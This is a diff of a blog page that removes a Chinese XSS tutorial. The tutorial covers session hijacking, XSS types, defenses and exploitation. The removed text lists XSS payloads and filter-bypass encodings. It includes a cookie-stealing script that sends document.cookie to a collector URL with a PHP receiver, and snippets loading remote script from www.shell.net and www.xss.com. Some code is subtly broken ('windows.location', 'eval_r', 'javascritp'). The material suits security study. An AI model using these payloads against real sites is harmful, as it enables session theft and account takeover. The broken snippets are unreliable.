@@ -377,189 +377,16 @@
 
       
         
+          <p>XSS(Cross-Site script)跨站脚本攻击。<br>XSS最大的特点就是能注入恶意的代码到用户浏览器的网页上，从而达到劫持用户会话的目的。<br>是一种经常出现再web应用程序中的计算机安全漏洞，是由于web应用程序对用户的输入过滤不严而产生的。攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采用cookie资料窃取，会话劫持，钓鱼欺骗等攻击手段。</p>
+          <!--noindex-->
           
-            <p>XSS(Cross-Site script)跨站脚本攻击。<br>XSS最大的特点就是能注入恶意的代码到用户浏览器的网页上，从而达到劫持用户会话的目的。<br>是一种经常出现再web应用程序中的计算机安全漏洞，是由于web应用程序对用户的输入过滤不严而产生的。攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采用cookie资料窃取，会话劫持，钓鱼欺骗等攻击手段。</p>
-<h1 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1. 基础知识"></a>1. 基础知识</h1><h2 id="1-1-Session"><a href="#1-1-Session" class="headerlink" title="1.1 Session"></a>1.1 Session</h2><p>服务器使用Session将用户身份信息临时保存在服务器上，用户离开网站后Session会被销毁。客户端使用Cookie保存SessionID。这种对用户身份信息存储的方式相对于Cookie来说，比较安全。</p>
-<h2 id="1-2-Cookie"><a href="#1-2-Cookie" class="headerlink" title="1.2 Cookie"></a>1.2 Cookie</h2><p>Cookie分为内存Cookie(临时型Cookie)和硬盘Cookie，内存Cookie储存在浏览器内存中，关闭浏览器则消失；硬盘Cookie以文本形式存储在硬盘上，由浏览器存取。Cookie由变量名与值组成，其属性里有标准的Cookie变量，也有用户自定义的属性。<br>cookie格式：<code>Set-Cookie:=[;=][;expiress=][;domain=][;path=][;secure][;httponly]</code><br>cookie各个参数详细内容：</p>
-<ul>
-<li>Set-Cookie:http响应头，向客户端发送Cookie。</li>
-<li>Name=value:每个Cookie必须包含的内容。</li>
-<li>Expires=date:EXpires确定了Cookie的有效终止日期，可选。如果缺省，则Cookie不保存在硬盘中，只保存在浏览器内存中。</li>
-<li>Domain=domain-name:确定了哪些inernet域中的web服务器可读取浏览器储存的Cookie，缺省为该web服务器域名。</li>
-<li>Path=path:定义了web服务器哪些路径下的页面可获取服务器发送的Cookie。</li>
-<li>Secure:在Cookie中标记该变量，表明只有为https通信协议时，浏览器才向服务器提交cookie。</li>
-<li>Httponly:禁止javascript读取,如果Cookie中的一个参数带有httponly，则这个参数将不能被javascript获取；httponly可以防止xss会话劫持攻击。</li>
-</ul>
-<h2 id="1-3-会话劫持"><a href="#1-3-会话劫持" class="headerlink" title="1.3 会话劫持"></a>1.3 会话劫持</h2><h3 id="1-3-1-普通攻击步骤"><a href="#1-3-1-普通攻击步骤" class="headerlink" title="1.3.1 普通攻击步骤"></a>1.3.1 普通攻击步骤</h3><p>1.目标用户登录站点<br>2.登录成功后，该用户会得到站点提供的一个会话标识SessionID<br>3.攻击者通过某种攻击手段捕获Session ID<br>4.攻击者通过捕获到的Session ID访问站点即可获得目标用户合法会话</p>
-<h3 id="1-3-2-获取SessionID的方式有多种"><a href="#1-3-2-获取SessionID的方式有多种" class="headerlink" title="1.3.2 获取SessionID的方式有多种"></a>1.3.2 获取SessionID的方式有多种</h3><p>1.暴力破解：尝试各种Session ID，直到破解为止<br>2.预测：如果Session ID使用非随机的方式产生，那么就有可能计算出来<br>3.窃取：使用网络嗅探(cain、ettercap)，XSS攻击等方法获得</p>
-<h2 id="1-4-会话固定"><a href="#1-4-会话固定" class="headerlink" title="1.4 会话固定"></a>1.4 会话固定</h2><p>会话固定（Session fixation）是一种诱骗受害者使用攻击者指定的会话标识（SessionID）的攻击手段。这是攻击者获取合法会话标识的最简单的方法。会话固定也可以看成是会话劫持的一种类型，原因是会话固定的攻击的主要目的同样是获得目标用户的合法会话，不过会话固定还可以是强迫受害者使用攻击者设定的一个有效会话，以此来获得用户的敏感信息。</p>
-<h3 id="1-4-1-攻击步骤"><a href="#1-4-1-攻击步骤" class="headerlink" title="1.4.1 攻击步骤"></a>1.4.1 攻击步骤</h3><p>1.攻击者通过某种手段重置目标用户的SessionID，然后监听用户会话状态；<br>2.目标用户携带攻击者设定的Session ID登录站点；<br>3.攻击者通过Session ID获得合法会话</p>
-<h2 id="1-5-攻击者重置SessionID的方式"><a href="#1-5-攻击者重置SessionID的方式" class="headerlink" title="1.5 攻击者重置SessionID的方式"></a>1.5 攻击者重置SessionID的方式</h2><p>重置Session ID的方法同样也有多种，可以是跨站脚本攻击，如果是URL传递Session ID，还可以通过诱导的方式重置该参数，比如可以通过邮件的方式诱导用户去点击重置Session ID的URL，使用Cookie传递可以避免这种攻击.使用Cookie来存放Session ID，攻击者可以在以下三种可用的方法中选择一种来重置Session ID。</p>
-<p>1.使用客户端脚本来设置Cookie到浏览器。大多数浏览器都支持用客户端脚本来设置Cookie的，例如document.cookie=”sessionid=123”，这种方式可以采用跨站脚本攻击来达到目的。防御方式可以是设置HttpOnly属性，但有少数低版本浏览器存在漏洞，即使设置了HttpOnly，也可以重写Cookie。所以还需要加其他方式的校验，如User-Agent验证，Token校验等同样有效。<br>2.使用HTML的\<meta>标签加Set-Cookie属性。服务器可以靠在返回的HTML文档中增加\<meta>标签来设置Cookie。例如<meta http-equiv="Set-Cookiecontent=”sessionid=123”">，与客户端脚本相比，对\<meta>标签的处理目前还不能被浏览器禁止。<br>3.使用Set-Cookie的HTTP响应头部设置Cookie。攻击者可以使用一些方法在Web服务器的响应中加入Set-Cookie的HTTP响应头部。</p>
-<h2 id="1-6-会话劫持防御方法"><a href="#1-6-会话劫持防御方法" class="headerlink" title="1.6 会话劫持防御方法"></a>1.6 会话劫持防御方法</h2><p>1.用户登录时生成新的Session ID。如果攻击者使用的会话标识符不是有效的，那么这种方式将会非常有效。如果不是有效的会话标识符，服务器将会要求用户重新登录。如果攻击者使用的是有效的Session ID，那么还可以通过校验的方式来避免攻击。<br>2.大部分防止会话劫持的方法对会话固定攻击同样有效。如设置HttpOnly，关闭透明化Session ID，User-Agent验证，Token校验等。<br>3.更改session的名称：session的默认名称是PHPSESSID,此变量会保存在cookie中，如果黑客不抓包分析，就不能猜到这个名称，阻挡部分攻击。</p>
-<h2 id="1-7-JavaScript-事件"><a href="#1-7-JavaScript-事件" class="headerlink" title="1.7 JavaScript 事件"></a>1.7 JavaScript 事件</h2><table>
-<thead>
-<tr>
-<th style="text-align:center">事件</th>
-<th style="text-align:center">描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">onabort</td>
-<td style="text-align:center">图像加载被中断</td>
-</tr>
-<tr>
-<td style="text-align:center">onblur</td>
-<td style="text-align:center">元素失去焦点</td>
-</tr>
-<tr>
-<td style="text-align:center">onchange</td>
-<td style="text-align:center">用户改变域的内容</td>
-</tr>
-<tr>
-<td style="text-align:center">onclick</td>
-<td style="text-align:center">鼠标单击HTML元素</td>
-</tr>
-<tr>
-<td style="text-align:center">ondblclick</td>
-<td style="text-align:center">鼠标双击HTML对象</td>
-</tr>
-<tr>
-<td style="text-align:center">onerror</td>
-<td style="text-align:center">d当加载文档或图像时发生某个错误</td>
-</tr>
-<tr>
-<td style="text-align:center">onmouseover</td>
-<td style="text-align:center">用户再一个HTML元素上移动鼠标</td>
-</tr>
-<tr>
-<td style="text-align:center">onmouseout</td>
-<td style="text-align:center">用户从一个HTML元素上移开鼠标</td>
-</tr>
-<tr>
-<td style="text-align:center">onkeydown</td>
-<td style="text-align:center">某个键盘的键被按下</td>
-</tr>
-<tr>
-<td style="text-align:center">onkeypress</td>
-<td style="text-align:center">某个键盘的键被按下或按住</td>
-</tr>
-<tr>
-<td style="text-align:center">onkeyup</td>
-<td style="text-align:center">某个键盘的键被松开</td>
-</tr>
-<tr>
-<td style="text-align:center">onload</td>
-<td style="text-align:center">浏览器已完成页面的加载</td>
-</tr>
-<tr>
-<td style="text-align:center">onmousedown</td>
-<td style="text-align:center">某个鼠标按键被按下</td>
-</tr>
-<tr>
-<td style="text-align:center">onmousemove</td>
-<td style="text-align:center">鼠标被移动</td>
-</tr>
-<tr>
-<td style="text-align:center">onmouseup</td>
-<td style="text-align:center">某个鼠标按键被松开</td>
-</tr>
-<tr>
-<td style="text-align:center">onreset</td>
-<td style="text-align:center">重置按钮被点击</td>
-</tr>
-<tr>
-<td style="text-align:center">onresize</td>
-<td style="text-align:center">窗口或框架被调整尺寸</td>
-</tr>
-<tr>
-<td style="text-align:center">onselect</td>
-<td style="text-align:center">文本被选定</td>
-</tr>
-<tr>
-<td style="text-align:center">onsubmit</td>
-<td style="text-align:center">提交按钮被点击</td>
-</tr>
-<tr>
-<td style="text-align:center">onunload</td>
-<td style="text-align:center">用户退出页面</td>
-</tr>
-</tbody>
-</table>
-<h1 id="2-XSS分类"><a href="#2-XSS分类" class="headerlink" title="2. XSS分类"></a>2. XSS分类</h1><h2 id="2-1-反射型XSS"><a href="#2-1-反射型XSS" class="headerlink" title="2.1 反射型XSS"></a>2.1 反射型XSS</h2><p>反射型跨站脚本也称作非持久型、参数型跨站脚本。这类型的脚本是最常见的，也是使用最为广泛的一种，主要用于将恶意的脚本附加到URL地址的参数中。<br>一般使用的将构造好的URL发给受害者，受害者点击触发，而且只执行一次，非持久化。</p>
-<h2 id="2-2-存储型XSS"><a href="#2-2-存储型XSS" class="headerlink" title="2.2 存储型XSS"></a>2.2 存储型XSS</h2><p>存储型XSS比反射型跨站脚本更具威胁性，并且可能影响到web服务器的自身安全。<br>此类XSS不需要用户点击特定的URL就能执行跨站脚本，攻击者事先将恶意JavaScript代码上传或存储到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。</p>
-<h2 id="2-3-DOM型XSS"><a href="#2-3-DOM型XSS" class="headerlink" title="2.3 DOM型XSS"></a>2.3 DOM型XSS</h2><p>简单去理解就是因为他输出点在DOM，将用户提交的参数(恶意代码)拿过来拼接HTML代码，利用可编辑的文档对象去自动生成HTML代码，让浏览器解析，达到攻击的目的</p>
-<p>利用思想：<br>1.在标签内部构造出恶意代码<br>2.标签闭合 让恶意代码逃逸出来</p>
-<blockquote>
-<p>注意：无论反射型还是存储型，都是需要与服务端交互的，即服务端将提交的内容反馈到了html源码内，导致触发xss，也就是说返回到html源码中可以看到触发xss的代码；而DOM型xss是不与服务端交互的，只与客户端上的js交互，也就是说提交的恶意代码，被放到了js中执行，然后显示出来。那么这种形式有一个问题，就是html源码里面不存在触发xss的代码，因为服务端返回的源码都是一样的，只不过源码里面包含了一段js，这段js再执行后生成了一段xss代码，可以在审查元素中查看到。</p>
-<p>From：<a href="https://thief.one/2017/05/31/1/" target="_blank" rel="noopener">浅谈跨站脚本攻击与防御</a></p>
-</blockquote>
-<h1 id="3-漏洞挖掘"><a href="#3-漏洞挖掘" class="headerlink" title="3. 漏洞挖掘"></a>3. 漏洞挖掘</h1><h2 id="3-1-FireFox中常用XSS调试插件"><a href="#3-1-FireFox中常用XSS调试插件" class="headerlink" title="3.1 FireFox中常用XSS调试插件"></a>3.1 FireFox中常用XSS调试插件</h2><p>Hackbar、Firebug、Tamper Data、Live HTTP Headers、Editor Cookie</p>
-<h2 id="3-2-手工挖掘"><a href="#3-2-手工挖掘" class="headerlink" title="3.2 手工挖掘"></a>3.2 手工挖掘</h2><p>闭合标签</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;img/src=@onerror=alert(1)/&gt;</span><br><span class="line">&quot;&gt;&lt;img/src=@onerror=alert(1)/&gt;</span><br><span class="line">&apos;onmouseover=alert(1) x=&apos;</span><br><span class="line">javascript:alert(1)//</span><br><span class="line">&quot;;alert(1)//</span><br></pre></td></tr></table></figure>
-<h3 id="3-2-1-数据交互的地方"><a href="#3-2-1-数据交互的地方" class="headerlink" title="3.2.1 数据交互的地方"></a>3.2.1 数据交互的地方</h3><p>登录、留言板、评论、搜索<br>测试用户输入的地方、文件上传的地方、flash</p>
-<h2 id="3-3-工具挖掘"><a href="#3-3-工具挖掘" class="headerlink" title="3.3 工具挖掘"></a>3.3 工具挖掘</h2><p>awvs、netsparke、appscan、burp、xsser、xsscrapy、brutexssr、OWASP Xenotix</p>
-<h1 id="4-XSS的危害"><a href="#4-XSS的危害" class="headerlink" title="4. XSS的危害"></a>4. XSS的危害</h1><p>1.网络钓鱼，包括盗取各类的用户账号<br>2.窃取用户cookie<br>3.窃取用户浏览会话<br>4.强制弹出广告页面、刷流量<br>5.网页挂马<br>6.提升用户权限，进一步渗透网站<br>7.传播跨站脚本蠕虫</p>
-<h1 id="5-防御XSS"><a href="#5-防御XSS" class="headerlink" title="5. 防御XSS"></a>5. 防御XSS</h1><h2 id="5-1-转义"><a href="#5-1-转义" class="headerlink" title="5.1 转义"></a>5.1 转义</h2><p>htmlspecialchars()函数把一些预定义的字符转换为HTML实体。<br>预定义字符：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp; （和号）成为 &amp;amp;</span><br><span class="line">&quot; （双引号）成为 &amp;quot;</span><br><span class="line">&apos; （单引号）成为 &amp;#39</span><br><span class="line">&lt; （小于）成为 &amp;lt;</span><br><span class="line">&gt; （大于）成为 &amp;gt;</span><br></pre></td></tr></table></figure>
-<h2 id="5-2-HTTPOnly"><a href="#5-2-HTTPOnly" class="headerlink" title="5.2 HTTPOnly"></a>5.2 HTTPOnly</h2><p>在php.ini中设置</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.cookie_httponly =</span><br></pre></td></tr></table></figure>
-<p>Cookie操作函数setcookie函数和setrawcookie函数也专门添加了第7个参数来做为HttpOnly的选项，开启方法为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">setcookie(&quot;abc&quot;, &quot;test&quot;, NULL, NULL, NULL, NULL, TRUE);  </span><br><span class="line">setrawcookie(&quot;abc&quot;, &quot;test&quot;, NULL, NULL, NULL, NULL, TRUE); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="5-3-输入过滤"><a href="#5-3-输入过滤" class="headerlink" title="5.3 输入过滤"></a>5.3 输入过滤</h2><p>（1）验证输入</p>
-<p>比如一个输入框，需要我们输入电话号码，电话号码必须是数字格式，有一定的长度，可以使用正则匹配 reg = /^020-\d{8}$/ </p>
-<p>常见的检测和过滤：</p>
-<p>输入是否仅仅包含合法的字符</p>
-<p>输入字符串是否超过最大限度</p>
-<p>输入如果为数字，数字是否在指定的范围内     <a href="mailto:pentest@163.com---" target="_blank" rel="noopener">pentest@163.com—</a>&gt;规则</p>
-<p>输入是否符合特殊格式要求，如E-mail地址、IP地址等 </p>
-<p>（2）采用黑名单过滤敏感字符</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt; &gt; &apos; &quot; &amp; # javascript expression a img script</span><br></pre></td></tr></table></figure>
-<p>注意，对用户输入的数据，不能仅仅在客户端使用JS进行验证，需要在服务器端进行验证检测。</p>
-<h2 id="5-4-输出过滤"><a href="#5-4-输出过滤" class="headerlink" title="5.4 输出过滤"></a>5.4 输出过滤</h2><p>对html字符，比如&lt;&gt;&amp;”等进行编码和转义</p>
-<p>很多程序语言退出相应的程序库，可以协助程序开发者针对html输出，如ASP的Server.HTMLEncode()函数、ASP.NET的Server.HtmlEncode()函数、PHP的htmlspecialchars()函数</p>
-<h2 id="5-5-限制标签使用"><a href="#5-5-限制标签使用" class="headerlink" title="5.5 限制标签使用"></a>5.5 限制标签使用</h2><p>控制用户可以使用的标签，只能使用一些安全的标签，如\<a>、\<div>等。</div></a></p>
-<h2 id="5-6-防XSS代码"><a href="#5-6-防XSS代码" class="headerlink" title="5.6 防XSS代码"></a>5.6 防XSS代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$x=preg_replace(&quot;/script/i&quot;,&quot;&quot;,$x);</span><br><span class="line">$x=preg_replace(&quot;/alert/i&quot;,&quot;&quot;,$x);</span><br></pre></td></tr></table></figure>
-<h2 id="5-7-内容安全策略"><a href="#5-7-内容安全策略" class="headerlink" title="5.7 内容安全策略"></a>5.7 内容安全策略</h2><p>Content Security Policy, CSP<br>内容安全策略是防御XSS攻击的一种安全机制，其思想是以服务器白名单的形式来配置可信的内容来源，客户端Web应用代码可以使用这些安全来源。Cisco研究人员找到了绕过CSP的一种方法，攻击者可以利用这种方法，注入被禁止的代码，从而窃取隐私数据。</p>
-<h1 id="6-综合利用"><a href="#6-综合利用" class="headerlink" title="6. 综合利用"></a>6. 综合利用</h1><h2 id="6-1-Cookie获取"><a href="#6-1-Cookie获取" class="headerlink" title="6.1 Cookie获取"></a>6.1 Cookie获取</h2><h3 id="6-1-1-反射型XSS的Cookie获取"><a href="#6-1-1-反射型XSS的Cookie获取" class="headerlink" title="6.1.1 反射型XSS的Cookie获取"></a>6.1.1 反射型XSS的Cookie获取</h3><p>将XSS发送给登录用户，使其点击<br>将URL写在图片中，更加隐蔽</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;URL&quot;&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="6-1-2-存储型XSS的Cookie获取"><a href="#6-1-2-存储型XSS的Cookie获取" class="headerlink" title="6.1.2 存储型XSS的Cookie获取"></a>6.1.2 存储型XSS的Cookie获取</h3><p>留言板 闭合文本域</p>
-<h3 id="6-1-3-HTTP-Only启用时获取Cookie"><a href="#6-1-3-HTTP-Only启用时获取Cookie" class="headerlink" title="6.1.3 HTTP-Only启用时获取Cookie"></a>6.1.3 HTTP-Only启用时获取Cookie</h3><p>JavaScript代码<br>接受PHP</p>
-<h3 id="6-1-4-编写接收Cookie代码"><a href="#6-1-4-编写接收Cookie代码" class="headerlink" title="6.1.4 编写接收Cookie代码"></a>6.1.4 编写接收Cookie代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	var cookie=document.cookie;</span><br><span class="line">	var url=&quot;http://127.0.0.1/cookie.php?x=&quot;;</span><br><span class="line">	windows.location.href=url+cookie;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	$cookie=$_GET[&apos;x&apos;]</span><br><span class="line">	$file=fopen(&quot;cookie.txt&quot;,&quot;w+&quot;);</span><br><span class="line">	fwrite($file,$cookie);</span><br><span class="line">	fclose($file);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="6-2-上传型xss"><a href="#6-2-上传型xss" class="headerlink" title="6.2 上传型xss"></a>6.2 上传型xss</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;.jpg</span><br></pre></td></tr></table></figure>
-<p>访问图片时会触发，需要闭合标签</p>
-<h2 id="6-3-通过XSS留后门"><a href="#6-3-通过XSS留后门" class="headerlink" title="6.3 通过XSS留后门"></a>6.3 通过XSS留后门</h2><p>在管理页面中插入xss获取cookie，每次管理员登录都可以获取cookie<br>需要获得webshell</p>
-<h1 id="7-Payload"><a href="#7-Payload" class="headerlink" title="7. Payload"></a>7. Payload</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1&apos;  onclick=alert(1) //</span><br><span class="line">1&apos;&gt;&lt; img src=# onerror=alert(1)&gt;//</span><br><span class="line">&apos;&gt;&lt;svg &lt;/onload =&quot;1&gt; (_=prompt,_(1)) &quot;&quot;&gt;&lt;a&apos;</span><br><span class="line">&apos;&gt;&lt;details open ontoggle=confirm()&gt;&lt;a&apos;</span><br><span class="line">&quot;&apos;/&gt; &lt;svg/onload=alert(1)//</span><br><span class="line">/&gt;&lt; img src=# onerror=alert(1)/&gt;//</span><br><span class="line">&quot;&quot;&apos; onmouseover=&quot;alert(1)&quot;</span><br><span class="line">&apos;&gt;&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt; a href=&apos; &apos;  onclick=alert(1) //   &apos;&gt;testLink&lt;/ a&gt;</span><br></pre></td></tr></table></figure>
-<h1 id="8-XSS-Payload绕过"><a href="#8-XSS-Payload绕过" class="headerlink" title="8.XSS Payload绕过"></a>8.XSS Payload绕过</h1><h2 id="8-1-大小写"><a href="#8-1-大小写" class="headerlink" title="8.1 大小写"></a>8.1 大小写</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ScRiPt&gt;alert(/xss/)&lt;/ScRiPt&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="8-2-重复写"><a href="#8-2-重复写" class="headerlink" title="8.2 重复写"></a>8.2 重复写</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="8-3-使用javascript伪协议"><a href="#8-3-使用javascript伪协议" class="headerlink" title="8.3 使用javascript伪协议"></a>8.3 使用javascript伪协议</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javascritp:alert(/xss/);&quot;&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="8-4-使用空格、回车、tab"><a href="#8-4-使用空格、回车、tab" class="headerlink" title="8.4 使用空格、回车、tab"></a>8.4 使用空格、回车、tab</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javas</span><br><span class="line">Cript:</span><br><span class="line">Alert(/xss/)&quot;&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="8-5-双引号改单引号"><a href="#8-5-双引号改单引号" class="headerlink" title="8.5 双引号改单引号"></a>8.5 双引号改单引号</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&apos;javascript:alert(/xss/);&apos;&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="8-6-利用JavaScript事件"><a href="#8-6-利用JavaScript事件" class="headerlink" title="8.6 利用JavaScript事件"></a>8.6 利用JavaScript事件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onmouseover=&quot;alert(/xss)&quot;&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="8-7-拆分"><a href="#8-7-拆分" class="headerlink" title="8.7 拆分"></a>8.7 拆分</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;z=&apos;document.&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;write(&quot;&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;&lt;script&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos; src=ht&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;tp://ww&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;w.shell&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;.net/1.&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;js&gt;&lt;/sc&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;ript&gt;&quot;)&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;eval_r(z)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="8-8-css中构造XSS-Payload"><a href="#8-8-css中构造XSS-Payload" class="headerlink" title="8.8 css中构造XSS Payload"></a>8.8 css中构造XSS Payload</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;list-style-image:url(javascript:alert(&apos;/xss/&apos;))&quot;&gt;</span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;http://www.xss.com/attack.css&quot;&gt;</span><br><span class="line">//在http://www.xss.com/attack.css中插入恶意代码</span><br></pre></td></tr></table></figure>
-<h2 id="8-9-字符编码"><a href="#8-9-字符编码" class="headerlink" title="8.9 字符编码"></a>8.9 字符编码</h2><h3 id="8-9-1-URL编码"><a href="#8-9-1-URL编码" class="headerlink" title="8.9.1 URL编码"></a>8.9.1 URL编码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%3Cimg%20src%3Dx%20onerror%3Dalert(/xss/)%3e</span><br></pre></td></tr></table></figure>
-<h3 id="8-9-2-HTML实体编码"><a href="#8-9-2-HTML实体编码" class="headerlink" title="8.9.2 HTML实体编码"></a>8.9.2 HTML实体编码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt; &gt;</span><br><span class="line">//十进制</span><br><span class="line">&amp;#60; &amp;#62;</span><br><span class="line">//Hex</span><br><span class="line">&amp;#x3c; &amp;#x3e;</span><br></pre></td></tr></table></figure>
-<h3 id="8-9-3-Hex"><a href="#8-9-3-Hex" class="headerlink" title="8.9.3 Hex"></a>8.9.3 Hex</h3><p>配合eval()使用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=eval(&quot;\x61\x6C\x65\x72\x74\x28\x2F\x78\x73\x73\x2F\x29&quot;)&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="8-9-4-十进制"><a href="#8-9-4-十进制" class="headerlink" title="8.9.4 十进制"></a>8.9.4 十进制</h3><p>Ascii码配合String.fromCharCode())使用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,47,120,115,115,47,41))&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="8-9-5-八进制"><a href="#8-9-5-八进制" class="headerlink" title="8.9.5 八进制"></a>8.9.5 八进制</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=eval(&quot;\141\154\145\162\164\50\57\170\163\163\57\51&quot;)&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="8-9-6-Unicode"><a href="#8-9-6-Unicode" class="headerlink" title="8.9.6 Unicode"></a>8.9.6 Unicode</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=eval(&quot;\u0061\u006C\u0065\u0072\u0074\u0028\u002F\u0078\u0073\u0073\u002F\u0029&quot;)&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="8-9-7-jsfuck"><a href="#8-9-7-jsfuck" class="headerlink" title="8.9.7 jsfuck"></a>8.9.7 jsfuck</h3><p>alert(/xss/)</p>
